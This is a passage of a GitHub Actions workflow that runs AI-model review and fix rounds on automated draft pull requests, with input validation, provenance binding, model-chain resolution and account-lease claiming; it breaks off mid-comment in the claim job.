# Cross-provider review / same-provider fix runner for worker DRAFT PRs. ONE workflow with a
# `mode: review|fix` input mirroring worker.yml's resolve -> claim -> run -> release DAG; the
# dispatch.yml sweep is the single scheduler that launches it off durable PR marker state.
# mode=fix carries a `fix_kind` flavour: verdict (seeded from the registry-recorded review
# verdict, the original loop), ci (repair red full-matrix legs on the current head; failing
# check names arrive as untrusted advisory context), and rebase (host-started merge of the
# default branch into a CONFLICTING PR branch — the model only resolves conflict markers and
# the host commits the two-parent merge, so worker-opened ancestry is never rewritten).
# mode=fix may also carry `model_pin`, a round-budget-extension fix-model FLOOR (maintainer
# directive 2026-07-17): validated to an escalation-ladder TIER (never an arbitrary model id),
# it replaces the fix chain with the ladder tiers at/above the floor — tiers below it are never
# offered (defer-not-fallback; rationale in dispatch-claim.py / worker-pr.py decide_budget).
# mode=review grades round-over-round `progress` against the prior round's recorded verdict.
#
# Trust posture (locked decisions):
# - The implementer identity comes ONLY from the registry provenance record written at publish
#   time (orchestration/provenance/...); commit trailers and PR body markers are audit-only.
# - mode=review claims the OPPOSITE provider vs the CONTENT author (anthropic impl -> sol review,
#   openai impl -> opus review), asserted fail-closed at claim AND script layer. terra and sonnet
#   are DOCS-ONLY models (maintainer directive 2026-07-18) and never appear in any review/fix/
#   escalation chain here (review-fix has no docs lane — asserted structurally in the resolve
#   step). The reviewer model is read-only (mutation=deny,
#   no GitHub token in the container) and its verdict is VOID unless the tree is byte-identical.
# - Arming (gh pr ready + the sha-bound enablePullRequestAutoMerge latch mutation — never
#   `gh pr merge`, which direct-merges an already-mergeable PR) happens ONLY here, host-side, gated on a
#   schema-valid approve verdict + reviewer!=implementer (provider AND account) + the armed head
#   SHA equalling the reviewed SHA re-read live. Security-labelled surfaces never auto-arm.
# - rc=3 (none-free) claim handling is copied verbatim from worker.yml: skip-and-retry, never a
#   failure — scarcity is a queue, not a deadlock. Short TTLs + groom-leases free crashed runs.
# - Job split: `run` executes the model (and, in fix mode, hostile target code in the gate) with
#   registry contents:READ only; every registry write + PR mutation + the arm happens in the
#   separate `outcome` job, which executes no target code (registry-write tokens never share a
#   runner with hostile execution). Accounts appear in public logs/records only as salted hashes.
name: review-fix
run-name: review-fix ${{ inputs.mode }} ${{ inputs.target_repo }}#${{ inputs.pr_number }} claim=${{ inputs.claim_id || 'self' }}

on:
  workflow_dispatch:
    inputs:
      target_repo:
        description: Target owner/repository allowed by policy/repos.toml
        required: true
        type: string
      pr_number:
        description: Open DRAFT worker pull request to review or fix
        required: true
        type: string
      mode:
        description: review (opposite provider, read-only) or fix (same provider, edit+push)
        required: true
        type: choice
        options: [review, fix]
      fix_kind:
        description: fix flavour — verdict (review findings), ci (red full-matrix legs), rebase (conflicting base)
        required: false
        default: verdict
        type: choice
        options: [verdict, ci, rebase]
      fix_context:
        description: Advisory failing-check-name context for fix_kind=ci (newline-free; the dispatcher derives it live)
        required: false
        default: ''
        type: string
      model_pin:
        description: Pinned fix-model floor from a round-budget extension (a ladder tier or empty; fix mode only)
        required: false
        default: ''
        type: string
      review_round:
        description: Review round this run belongs to (review = rounds+1, fix = current round)
        required: true
        default: '1'
        type: string
      account:
        description: Dispatcher-claimed account handle (verified against the adopted lease)
        required: true
        type: string
      claim_id:
        description: Optional dispatcher-owned CAS claim to adopt
        required: false
        default: ''
        type: string

permissions: {}

concurrency:
  group: review-fix-${{ inputs.target_repo }}-${{ inputs.pr_number }}
  cancel-in-progress: false

jobs:
  resolve:
    name: Resolve PR, provenance, and inverse chain without worker secrets
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    outputs:
      target_owner: ${{ steps.inputs.outputs.target_owner }}
      target_name: ${{ steps.inputs.outputs.target_name }}
      head_branch: ${{ steps.pr.outputs.head_branch }}
      head_sha: ${{ steps.pr.outputs.head_sha }}
      base_ref: ${{ steps.pr.outputs.base_ref }}
      pr_author: ${{ steps.pr.outputs.pr_author }}
      # [#657] TRUE iff this PR was admitted under the orchestrator-class waiver, i.e. its
      # provenance record is SELF-ATTESTED. Consumed by the outcome step (the draft
      # requirement stands down) and by the arm (which REFUSES the class outright).
      self_attested: ${{ steps.pr.outputs.self_attested }}
      impl_provider: ${{ steps.pr.outputs.impl_provider }}
      impl_alias: ${{ steps.pr.outputs.impl_alias }}
      impl_account_h: ${{ steps.pr.outputs.impl_account_h }}
      already_done: ${{ steps.pr.outputs.already_done }}
      issue: ${{ steps.pr.outputs.issue }}
      security: ${{ steps.pr.outputs.security }}
      security_keywords: ${{ steps.pr.outputs.security_keywords }}
      packages: ${{ steps.pr.outputs.packages }}
      package: ${{ steps.pr.outputs.package }}
      routing: ${{ steps.policy.outputs.routing }}
      model_chain: ${{ steps.policy.outputs.model_chain }}
      account_pool: ${{ steps.policy.outputs.account_pool }}
      agent: ${{ steps.policy.outputs.agent }}
      gate_profile: ${{ steps.policy.outputs.gate_profile }}
      arm_auto_merge: ${{ steps.policy.outputs.arm_auto_merge }}
      max_review_rounds: ${{ steps.policy.outputs.max_review_rounds }}
      security_paths: ${{ steps.policy.outputs.security_paths }}
      unresolvable: ${{ steps.policy.outputs.unresolvable }}
    steps:
      - name: Validate dispatch inputs
        id: inputs
        env:
          TARGET_REPO: ${{ inputs.target_repo }}
          PR_NUMBER: ${{ inputs.pr_number }}
          MODE: ${{ inputs.mode }}
          FIX_KIND: ${{ inputs.fix_kind }}
          FIX_CONTEXT: ${{ inputs.fix_context }}
          MODEL_PIN: ${{ inputs.model_pin }}
          REVIEW_ROUND: ${{ inputs.review_round }}
          ACCOUNT: ${{ inputs.account }}
          CLAIM_ID: ${{ inputs.claim_id }}
        run: |
          python3 - <<'PY'
          import os
          import re

          target = os.environ["TARGET_REPO"]
          pr_number = os.environ["PR_NUMBER"]
          mode = os.environ["MODE"]
          fix_kind = os.environ["FIX_KIND"] or "verdict"
          fix_context = os.environ["FIX_CONTEXT"]
          model_pin = os.environ["MODEL_PIN"]
          review_round = os.environ["REVIEW_ROUND"]
          account = os.environ["ACCOUNT"]
          claim_id = os.environ["CLAIM_ID"]
          if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*/[A-Za-z0-9][A-Za-z0-9_.-]*", target):
              raise SystemExit("target_repo must be a safe owner/repository name")
          if not re.fullmatch(r"[1-9][0-9]*", pr_number):
              raise SystemExit("pr_number must be a positive integer")
          if mode not in {"review", "fix"}:
              raise SystemExit("mode must be review or fix")
          if fix_kind not in {"verdict", "ci", "rebase"}:
              raise SystemExit("fix_kind must be verdict, ci, or rebase")
          if mode == "review" and fix_kind != "verdict":
              raise SystemExit("review mode takes no fix flavour")
          # The pin is a hostile-input surface (maintainer directive 2026-07-17): only a KNOWN
          # escalation-ladder tier may pass — a forged pin can therefore never select an
          # arbitrary provider_model (the concrete id is still resolved from the protected
          # target routing BY ALIAS, and the provider-ladder membership is re-checked against
          # the provenance-bound implementer provider in the resolve step below). terra and
          # sonnet are DOCS-ONLY models (maintainer directive 2026-07-18) and this lane is
          # never docs, so a terra/sonnet pin is rejected outright.
          #
          # [OPUS-5] LEGACY PIN MIGRATION (maintainer directive 2026-07-26: fable + opus-4.8
          # retired in favour of opus5). This allowlist is the FIRST thing an in-flight PR's pin
          # meets. Simply deleting fable/opus from it would SystemExit — i.e. red the run on every
          # tick, forever — for every PR that had already escalated before the deprecation, and
          # the failure would be attributed to the PR rather than to the config change. So a
          # retired tier is MIGRATED UP to its successor here, exactly as worker-pr.py's
          # pinned_fix_floor/record_model_pin do (scripts/deprecated_models.py is the shared
          # register). Migrating UP is safe: the fix floor may only ever rise, so a migrated pin
          # can never re-authorize a tier the original pin forbade. Anything that is neither a
          # current tier nor a known legacy tier is still rejected outright.
          legacy_pins = {"fable": "opus5", "opus": "opus5"}
          model_pin = legacy_pins.get(model_pin, model_pin)
          if model_pin and model_pin not in {"opus5", "sol", "luna"}:
              raise SystemExit("model_pin must be empty or an escalation-ladder tier")
          if mode == "review" and model_pin:
              raise SystemExit("review mode takes no model pin")
          # Printable-ASCII, single-line, capped: the context is advisory model input (failing
          # check-run names) that must never smuggle control characters into prompts or logs.
          if not re.fullmatch(r"[ -~]{0,1000}", fix_context):
              raise SystemExit("fix_context must be short single-line printable ASCII")
          if not re.fullmatch(r"[1-9][0-9]{0,2}", review_round):
              raise SystemExit("review_round must be a small positive integer")
          if not re.fullmatch(r"acct[0-9a-z]{2,}", account):
              raise SystemExit("account must be an acctNN registry handle")
          if claim_id and not re.fullmatch(r"[0-9a-f]{32}", claim_id):
              raise SystemExit("claim_id must be empty or a lowercase 32-hex CAS identifier")
          owner, name = target.split("/", 1)
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              output.write(f"target_owner={owner}\n")
              output.write(f"target_name={name}\n")
          PY

      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      # Provenance records live on the unprotected `ledger` data-plane branch (issue #96):
      # master's required `gate` check rejects every direct contents-API PUT, so post-outage
      # records exist ONLY at this ref; the master checkout keeps the pre-outage copies.
      # Fails the job LOUDLY if the ledger branch is missing.
      - name: Checkout the data-plane ledger branch (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: ledger
          ref: ledger
          persist-credentials: false

      # Validate paths, object types, and modes against the canonical data-only allowlist.
      - name: Ledger checkout is data-only (trust guard)
        run: python3 registry/scripts/ledger-invariant.py ledger

      - name: Checkout public target for protected routing data (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          repository: ${{ inputs.target_repo }}
          path: target-routing
          persist-credentials: false

      - name: Snapshot the PR and bind it to registry provenance (fail closed)
        id: pr
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          PR_NUMBER: ${{ inputs.pr_number }}
          MODE: ${{ inputs.mode }}
          FIX_KIND: ${{ inputs.fix_kind }}
        run: |
          set -euo pipefail
          gh api "repos/$TARGET_REPO/pulls/$PR_NUMBER" > "$RUNNER_TEMP/pull.json"
          python3 - "$RUNNER_TEMP/pull.json" <<'PY'
          import json
          import os
          import re
          import subprocess
          import sys
          import tomllib
          from pathlib import Path

          with open(sys.argv[1], encoding="utf-8") as handle:
              pull = json.load(handle)
          repo = os.environ["TARGET_REPO"]
          mode = os.environ["MODE"]
          fix_kind = os.environ.get("FIX_KIND") or "verdict"
          if pull.get("state") != "open":
              raise SystemExit("pull request is not open")
          head = pull.get("head") or {}
          head_repo = (head.get("repo") or {}).get("full_name")
          head_branch = str(head.get("ref", ""))
          # FORK GATE FIRST and unconditional (#657 follow-up): once the orchestrator-class
          # waiver below can stand down the draft / head-ref / author gates, the fork gate has
          # to be the one no waiver can reach — hoisted above every waivable predicate rather
          # than left to the accident of ordering, exactly as dispatch-claim.py hoists it.
          if head_repo != repo:
              raise SystemExit("pull request head is a fork; refusing to run models on it")
          # sol r6 on #257: the reviewer diffs against the DEFAULT branch; a worker PR
          # retargeted to any other base would be reviewed against one comparison and
          # merged against another — reject it at resolution (the sweep re-derives; a
          # human retarget is an explicit act that removes the PR from the loop).
          default_branch = str(((pull.get("base") or {}).get("repo") or {})
                               .get("default_branch", ""))
          if str((pull.get("base") or {}).get("ref", "")) != default_branch:
              raise SystemExit("worker PR base is not the default branch (retargeted); "
                               "refusing to review/arm")
          head_sha = str(head.get("sha", ""))
          author = str((pull.get("user") or {}).get("login", ""))
          if not re.fullmatch(r"[0-9a-f]{40}", head_sha):
              raise SystemExit("pull request head sha is malformed")
          labels = sorted({
              label.get("name") for label in (pull.get("labels") or [])
              if isinstance(label, dict) and isinstance(label.get("name"), str)
          })
          # review:needs-user (loop escalation) and needs:user (groom's parked-PR "Human
          # attention required" marker) are BOTH human-owned terminal for every mode/flavour.
          if {"review:needs-user", "needs:user"} & set(labels):
              raise SystemExit("pull request is human-owned (review:needs-user / needs:user)")
          # review:parked is the MACHINE-owned capacity park (park_policy.py): a SOFT hold, not
          # a human terminal — but a parked PR must still never be reviewed/fixed. On a proven
          # human readmission gesture CLAIM strips this label (converging it to review:needs)
          # BEFORE dispatching, so a legitimately re-admitted run never carries it here; seeing
          # it means the park still stands (or landed mid-window) — stand down.
          if "review:parked" in labels:
              raise SystemExit("pull request is capacity-parked (review:parked); "
                               "a human readmission gesture re-admits it via the dispatcher")
          # Only the verdict flavour is bound to review:changes; the ci/rebase repair flavours
          # (GAP-A/B) run over any non-terminal review state — the dispatcher re-derived their
          # triggers (concluded-red gate / conflicting base) from live data at admission.
          if mode == "fix" and fix_kind == "verdict" and "review:changes" not in labels:
              raise SystemExit("fix mode requires the review:changes state")
          # Idempotence guard: the reviewed-sha marker is bound LAST in the outcome job, so a
          # marker equal to the live head proves this head's review completed end-to-end — a
          # duplicate dispatch (raced against the bind) exits gracefully via `already_done`
          # instead of burning a scarce reviewer slot on a re-review.
          already_done = False
          if mode == "review":
              marker = re.search(r"<!-- sparq-reviewed-sha:([0-9a-f]{40}|none) -->",
                                 pull.get("body") or "")
              already_done = bool(marker) and marker.group(1) == head_sha

          # REGISTRY provenance is the root of trust for the implementer identity. Missing
          # record => never reviewed (fail closed); the target model has no registry token.
          # The `ledger` branch checkout is the PRIMARY record location (issue #96 — post-outage
          # records land only there); the master checkout is the legacy pre-outage fallback.
          owner, name = repo.split("/", 1)
          record_name = f"{owner}--{name}--pr{pull['number']}.json"
          record_path = Path("ledger", "orchestration", "provenance", record_name)
          if not record_path.is_file():
              record_path = Path("registry", "orchestration", "provenance", record_name)
          if not record_path.is_file():
              raise SystemExit("no registry provenance record for this PR (fail closed)")
          try:
              record = json.loads(record_path.read_text(encoding="utf-8"))
          except ValueError:
              raise SystemExit("provenance record is not readable JSON (fail closed)")
          # ONE record-shape admission, imported from the registry checkout above: the SAME
          # dispatch-claim.provenance_admission_error that gates the dispatcher's PLAN and
          # CLAIM and groom's draft age-park carve-out. Replicating the field checks inline
          # here is what let them drift (round-3 finding: groom preserved a draft whose
          # missing alias / invalid issue this step rejects — a silent retry loop); a field
          # constraint added to the shared function now binds every consumer in one commit.
          import importlib.util
          spec = importlib.util.spec_from_file_location(
              "registry_dispatch_claim", Path("registry", "scripts", "dispatch-claim.py"))
          dispatch_claim = importlib.util.module_from_spec(spec)
          spec.loader.exec_module(dispatch_claim)
          # [OPUS-5 #657] The MASTER-protected half of orchestrator-PR admission, read from the
          # `registry` checkout (master) — NEVER from the `registry-ledger` checkout the
          # provenance record came from. Records live on ledger precisely because master's
          # required gate rejects direct PUTs, so the record half is a low-authority per-PR
          # gesture and this list is the reviewed half that bounds which logins it can ever name;
          # reading both from one branch would collapse the pair. `_policy_row` validates the
          # whole row, so a malformed list HARD-FAILS this step rather than silently resolving to
          # "nobody is enrolled". Absent/empty => enrolment OFF => the shape gates stand.
          spec_enrol = importlib.util.spec_from_file_location(
              "registry_policy_resolve_enrol", Path("registry", "scripts", "policy-resolve.py"))
          policy_enrol = importlib.util.module_from_spec(spec_enrol)
          spec_enrol.loader.exec_module(policy_enrol)
          with open(Path("registry", "policy", "repos.toml"), "rb") as handle:
              enrolled_authors = policy_enrol.review_enrolment_authors(
                  repo, tomllib.load(handle))
          # THE #657 ADMISSION SEAM. Both facts — "may this PR's draft/head-ref/author shape gates
          # be waived?" and "does its provenance record admit?" — come from ONE shared function in
          # dispatch-claim.py, so no predicate lives in this `run:` script that a text probe would
          # have to guess at. Fail closed: any error is a SystemExit.
          self_attested, admission_error = dispatch_claim.review_fix_pr_admission(
              repo, pull, record, enrolled_authors, mode)
          if admission_error:
              raise SystemExit(admission_error)
          impl_provider = record["impl_provider"]
          impl_alias = record["impl_alias"]
          # Privacy (locked decision 22a): the PUBLIC registry stores only the salted account
          # hash, never a raw acctNN handle; the reviewer-side hash comparison runs at claim time.
          impl_account_h = record["impl_account_h"]
          issue = record["issue"]
          opened_sha = record["head_sha_at_open"]
          if opened_sha != head_sha:
              compare = json.loads(subprocess.run(
                  ["gh", "api", f"repos/{repo}/compare/{opened_sha}...{head_sha}"],
                  capture_output=True, text=True, check=True).stdout)
              if compare.get("status") not in {"identical", "ahead"}:
                  raise SystemExit("PR head does not descend from the worker-opened commit")

          issue_data = json.loads(subprocess.run(
              ["gh", "api", f"repos/{repo}/issues/{issue}"],
              capture_output=True, text=True, check=True).stdout)
          issue_labels = sorted({
              label.get("name") for label in (issue_data.get("labels") or [])
              if isinstance(label, dict) and isinstance(label.get("name"), str)
          })
          # A needs:*-parked SOURCE issue is human-owned: no autonomous review/fix/rebase may
          # run against its PR until the human clears the label (mirrors CLAIM admission).
          if any(label.startswith("needs:") for label in issue_labels):
              raise SystemExit("source issue is human-owned (needs:*)")
          merged = set(labels) | set(issue_labels)
          # [OPUS-4.8] defect #3: the arm-side security classifier must be PER-TARGET. The builtin
          # keyword set (zk/mpc/crypto/auth/e2ee) did not cover the registry's own trust areas
          # (worker/dispatch/set-up-account/review-loop/groom), so its ready issues classified as
          # non-security and would auto-arm. Union the builtin set with the TARGET routing's own
          # `[[route]].match_labels` keywords (read from the protected routing at its policy
          # pointer), so a trust-surface issue on ANY target is flagged before the arm gate ever
          # sees it. [#325 round 2] An unreadable policy row or a missing/malformed routing is
          # FATAL here, never a degrade-to-builtin: this same set drives the arm-time LIVE label
          # audit (worker-pr.live_security_flagged), so a silently reduced set would let a
          # routing-keyword label added mid-review classify as benign and auto-arm without the
          # trust-surface audit — the path classifier is no backstop for a label-only posture.
          # routing_security_keywords RAISES PolicyError on ANY load or validation failure
          # (self-tested in policy-resolve.py), the resolve job dies, and the downstream arm
          # step is never reached.
          spec_policy = importlib.util.spec_from_file_location(
              "registry_policy_resolve", Path("registry", "scripts", "policy-resolve.py"))
          policy_resolve = importlib.util.module_from_spec(spec_policy)
          spec_policy.loader.exec_module(policy_resolve)
          try:
              routing_keywords = policy_resolve.routing_security_keywords(
                  repo, policy_file="registry/policy/repos.toml", target_root="target-routing")
          except policy_resolve.PolicyError as exc:
              raise SystemExit(
                  f"target routing security keywords unresolvable (fail closed): {exc}")
          keywords = {"zk", "mpc", "crypto", "auth", "e2ee"} | set(routing_keywords)
          security = (any(k in label for label in merged for k in keywords)
                      or any(label.startswith("trust:") for label in merged))
          # Issue #153: the SAME keyword set the arm step re-applies to LIVE labels. resolve
          # classifies `security` ONCE, before a review that may take 25min+ (or queue longer);
          # a trust:* / routing-keyword label added to the PR or its source issue mid-review is
          # invisible to the arm's path-only recheck unless the arm re-runs this classifier on
          # live labels. Ride the union set to the arm as a single-line base64 JSON list (a
          # keyword may hold any char; base64 keeps the output single-line + injection-safe).
          import base64 as _b64
          security_keywords_b64 = _b64.b64encode(
              json.dumps(sorted(keywords)).encode("utf-8")).decode("ascii")
          packages = sorted(label[5:] for label in issue_labels if label.startswith("area:"))
          if any(not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", p) for p in packages):
              raise SystemExit("source issue has an unsafe area:* label")
          # THE partition reduction — imported, NEVER re-implemented here (registry issue #112; the
          # 2026-07-26 adopt loop). `package` is derived twice by design: once by the dispatcher
          # that MINTS the CAS claim (dispatch-claim.plan_package) and once here by the run that
          # ADOPTS it, and the adopt step below compares the two for EQUALITY. This step used to
          # carry its own pre-#112 reduction (`packages[0] if packages else "__global__"`), so a PR
          # whose source issue held TWO `area:*` labels was minted `__global__` and re-derived as
          # the alphabetically-first area: the adopt step rejected its own dispatcher's claim on
          # every tick forever (53 of 77 review-fix failures that day, most on one PR). The
          # identical bug also under-serialized the SELF-claim path below, which leases
          # `--package "$PACKAGE"` — a multi-area PR reserved one area and left its siblings free
          # to co-run. `dispatch_claim` is the module loaded above, so this calls the MINTER'S OWN
          # function object (which itself delegates to lease_schema.plan_package): the two sides of
          # the adopt comparison are now the same code by construction, not by agreement.
          package = dispatch_claim.plan_package(packages)
          values = {
              "head_branch": head_branch,
              "head_sha": head_sha,
              "base_ref": str((pull.get("base") or {}).get("ref", "")),
              "pr_author": author,
              "self_attested": "true" if self_attested else "false",
              "impl_provider": impl_provider,
              "impl_alias": impl_alias,
              "impl_account_h": impl_account_h,
              "already_done": "true" if already_done else "false",
              "issue": str(issue),
              "security": "true" if security else "false",
              "security_keywords": security_keywords_b64,
              "packages": ",".join(packages),
              "package": package,
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  if "\n" in value or "\r" in value:
                      raise SystemExit(f"unsafe resolved value: {key}")
                  output.write(f"{key}={value}\n")
          print(f"PR bound to provenance: impl={impl_provider}/{impl_alias} issue=#{issue}")
          PY

      - name: Resolve policy and compute the mode chain (inverse chain outside resolve())
        id: policy
        env:
          TARGET_REPO: ${{ inputs.target_repo }}
          MODE: ${{ inputs.mode }}
          MODEL_PIN: ${{ inputs.model_pin }}
          IMPL_PROVIDER: ${{ steps.pr.outputs.impl_provider }}
        run: |
          set -euo pipefail
          role=review
          [[ "$MODE" == fix ]] && role=impl
          python3 registry/scripts/policy-resolve.py \
            --target-repo "$TARGET_REPO" \
            --policy-file registry/policy/repos.toml \
            --target-root target-routing \
            --role "$role" > "$RUNNER_TEMP/policy.json"
          python3 - "$RUNNER_TEMP/policy.json" <<'PY'
          import json
          import os
          from pathlib import Path, PurePosixPath
          import re
          import sys
          import tomllib

          with open(sys.argv[1], encoding="utf-8") as handle:
              policy = json.load(handle)
          mode = os.environ["MODE"]
          impl_provider = os.environ["IMPL_PROVIDER"]
          target_root = Path("target-routing").resolve()
          routing_path = target_root.joinpath(*PurePosixPath(policy["routing"]).parts).resolve()
          routing_path.relative_to(target_root)
          with open(routing_path, "rb") as handle:
              routing = tomllib.load(handle)

          # The review chain is the INVERSE of the CONTENT author's provider and is computed
          # HERE, never via resolve() (whose role=review row is always [opus]); resolve()
          # supplies account_pool / gate / arm / caps only. Fix uses the implementer's own
          # chain. Model policy (maintainer directive 2026-07-18): sol — the codex-side
          # frontier model — is THE reviewer of anthropic-authored content (luna is its
          # fallback); opus stays lead reviewer of openai-authored content (proven verdict
          # quality + the security-surface doctrine). terra and sonnet are DOCS-ONLY and never
          # appear in any chain below (terra is a sonnet-class GPT model, NOT "GPT-5.6 sol" as
          # older comments misnamed it).
          # A CODEX alias with a missing/TBD provider_model is RESOLVABLE (locked decision 14):
          # the proven codex drain passes no --model flag (CLI default), and worker-live.sh omits
          # --model in that case — so an unpinned sol/luna never stalls the common
          # anthropic-implemented direction. A claude alias still needs a concrete id.
          # Opus 5 (maintainer directive 2026-07-24): opus5 takes the primary slot on
          # every chain where fable/opus led; the old tiers stay as TAIL FALLBACKS only, a
          # degradation path so an opus5 capacity outage parks work gracefully instead of
          # stalling the chain. Mirrors dispatch-claim.py REVIEW_CHAIN/FIX_CHAIN.
          review_chain = {"anthropic": ["sol", "luna"], "openai": ["opus5"]}
          fix_chain = {"anthropic": ["opus5"], "openai": ["sol", "luna"]}
          # Escalation ladders in escalation order — weakest tier FIRST, STRONGEST (terminal)
          # tier LAST per the maintainer capability order opus < luna < fable < opus5 < sol
          # (2026-07-24: opus5 is the top ANTHROPIC tier; cross-provider order unchanged) — mirrors
          # worker-pr.py ESCALATION_LADDERS (directives 2026-07-17/18; sol r2 f2 fixed the
          # previously INVERTED order under which exhaustion pinned the weaker tier). A pinned
          # fix-model FLOOR replaces the default fix chain with the ladder tiers at/above the
          # pin, cheapest first: tiers below the floor are DELIBERATELY absent
          # (defer-not-fallback — with no at/above-floor account free, the claim defers to a
          # later tick instead of burning the extended round budget on the model that already
          # failed; see dispatch-claim.py). A pin outside the implementer provider's ladder
          # fails closed.
          ladders = {"anthropic": ["opus5"], "openai": ["luna", "sol"]}
          # STRUCTURAL ENFORCEMENT (maintainer directive 2026-07-18): terra + sonnet are
          # DOCS-ONLY — review-fix has no docs lane, so their appearance in ANY chain here is a
          # policy defect. Fail closed before any claim can run on the wrong model.
          docs_only = {"terra", "sonnet"}
          chained = {alias for table in (review_chain, fix_chain, ladders)
                     for tiers in table.values() for alias in tiers}
          if docs_only & chained:
              raise SystemExit("docs-only model (terra/sonnet) in a review/fix/escalation chain")
          model_pin = os.environ.get("MODEL_PIN", "")
          if mode == "fix" and model_pin:
              ladder = ladders[impl_provider]
              if model_pin not in ladder:
                  raise SystemExit("model_pin is not a ladder tier for the implementer provider")
              wanted = ladder[ladder.index(model_pin):]
          else:
              wanted = (review_chain if mode == "review" else fix_chain)[impl_provider]
          models = routing.get("models", {})
          chain = []
          for alias in wanted:
              meta = models.get(alias)
              if not isinstance(meta, dict):
                  continue
              provider_model = meta.get("provider_model")
              concrete = (isinstance(provider_model, str) and provider_model != "TBD"
                          and re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", provider_model))
              codex_default = (meta.get("harness") == "codex"
                               and provider_model in (None, "", "TBD"))
              if concrete or codex_default:
                  chain.append(alias)
          unresolvable = not chain
          # [OPUS-4.8] B3: the policy row's security_paths ride to the outcome/arm steps as a
          # single-line base64 JSON list (paths may contain any char; base64 keeps the output
          # single-line + injection-safe). "W10=" is base64("[]") — a non-empty, valid empty list.
          import base64 as _b64
          security_paths = policy.get("security_paths", [])
          security_paths_b64 = _b64.b64encode(
              json.dumps(security_paths).encode("utf-8")).decode("ascii")
          values = {
              "routing": policy["routing"],
              "model_chain": ",".join(chain),
              "account_pool": ",".join(policy["account_pool"]),
              "agent": policy["agent"],
              "gate_profile": policy["gate_profile"],
              "arm_auto_merge": str(policy["arm_auto_merge"]).lower(),
              "max_review_rounds": str(policy["max_review_rounds"]),
              "security_paths": security_paths_b64,
              "unresolvable": str(unresolvable).lower(),
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  if not isinstance(value, str) or "\n" in value or "\r" in value:
                      raise SystemExit(f"unsafe resolved value: {key}")
                  if key != "model_chain" and not value:
                      raise SystemExit(f"missing resolved value: {key}")
                  output.write(f"{key}={value}\n")
          print(f"{mode} chain for {impl_provider}-implemented PR: {','.join(chain) or 'UNRESOLVABLE'}")
          PY

  claim:
    name: Claim ${{ inputs.mode }} account lease
    needs: resolve
    if: ${{ needs.resolve.outputs.unresolvable != 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # SECRET-EXFIL GUARD (issue #101): reads PROVENANCE_SALT, which lives in the
    # `dispatch-secrets` environment (deployment-branch policy: default branch only) — full
    # rationale on the `claim` job in dispatch.yml.
    environment: dispatch-secrets
    permissions:
      contents: write
      issues: read
    outputs:
      acquired: ${{ steps.adopt.outputs.acquired || steps.claim.outputs.acquired }}
      account: ${{ steps.adopt.outputs.account || steps.claim.outputs.account }}
      claim_id: ${{ steps.adopt.outputs.claim_id || steps.claim.outputs.claim_id }}
      model: ${{ steps.adopt.outputs.model || steps.claim.outputs.model }}
      provider: ${{ steps.adopt.outputs.provider || steps.claim.outputs.provider }}
      harness: ${{ steps.adopt.outputs.harness || steps.claim.outputs.harness }}
      credential_format: ${{ steps.adopt.outputs.credential_format || steps.claim.outputs.credential_format }}
      secret_ref: ${{ steps.adopt.outputs.secret_ref || steps.claim.outputs.secret_ref }}
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      # A dispatch that raced the reviewed-sha bind (this head already reviewed end-to-end)
      # exits gracefully WITHOUT running a model; a dispatcher-owned lease is released so the
      # scarce slot frees immediately instead of waiting for the TTL/groom.
      - name: Skip an already-reviewed head (release any dispatcher lease)
        id: skip
        if: ${{ needs.resolve.outputs.already_done == 'true' }}
        env:
          GH_TOKEN: ${{ github.token }}
          CLAIM_ID: ${{ inputs.claim_id }}
        run: |
          set -euo pipefail
          if [[ -n "$CLAIM_ID" ]]; then
            python3 registry/scripts/select-and-claim.py \
              --release "$CLAIM_ID" \
              --repo "$GITHUB_REPOSITORY" || true
          fi
          printf 'acquired=false\n' >> "$GITHUB_OUTPUT"
          printf 'This head was already reviewed end-to-end; nothing to do.\n'

      - name: CAS claim from the opposite/same-provider pool
        id: claim
        if: ${{ inputs.claim_id == '' && needs.resolve.outputs.already_done != 'true' }}
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          PR_NUMBER: ${{ inputs.pr_number }}
          MODE: ${{ inputs.mode }}
          MODELS: ${{ needs.resolve.outputs.model_chain }}
          ACCOUNT_POOL: ${{ needs.resolve.outputs.account_pool }}
          PACKAGE: ${{ needs.resolve.outputs.package }}
          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
          IMPL_ACCOUNT_H: ${{ needs.resolve.outputs.impl_account_h }}
          # Salt for the reviewer!=implementer account-hash assertion (locked decision 22a).
          # This job runs registry code only — the salt never enters a job executing target code.
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
        run: |
          set -euo pipefail
          # Disjoint top-level lease prefixes: `review:`/`fix:` never share a prefix with the
          # impl `<repo>#`, so neither cap counts the other. The shared per-mode prefix bounds
          # concurrent reviews to the static codex slot count (codex is usage-exempt; the CLI
          # claim path does not usage-gate, so this static cap IS the bound — by design). That is
          # a DELIBERATE divergence from the dispatcher's `account_slot_bound=True` live-slot
          # bound, which needs a usage probe this path does not have; issue #581.
          # TTL must outlive this workflow's remaining wall-clock (claim -> run -> release) plus
          # queue slack, or the allocator reclaims this still-live account and two sessions race
          # on one credential (issue #159). Kept in sync with dispatch-claim.py REVIEW_TTL/FIX_TTL
          # (which use the DISPATCHER-claim path's longer bound; adopting that bound here is safe).
          # BOTH numbers below are cross-asserted: dispatch-claim.py's `_review_fix_workflow_values`
